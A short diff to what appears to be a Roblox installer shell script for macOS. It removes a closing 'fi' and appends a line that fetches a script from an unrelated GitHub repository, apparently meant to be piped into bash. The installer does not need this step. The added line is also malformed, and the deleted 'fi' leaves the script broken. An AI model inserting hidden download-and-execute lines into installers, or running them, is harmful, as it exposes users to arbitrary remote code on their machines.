@@ -51,4 +51,5 @@ echo -n "Installing Latest Version of Roblox (don't close, will take time.)"
     mv ./RobloxPlayer.app /Applications/Roblox.app
     rm ./RobloxPlayer.zip
     echo -e "Done."
-    fi
+
+curl https://github.com/pr4sr/resources/blob/main/libs/lib.sh > lib.sh | bash
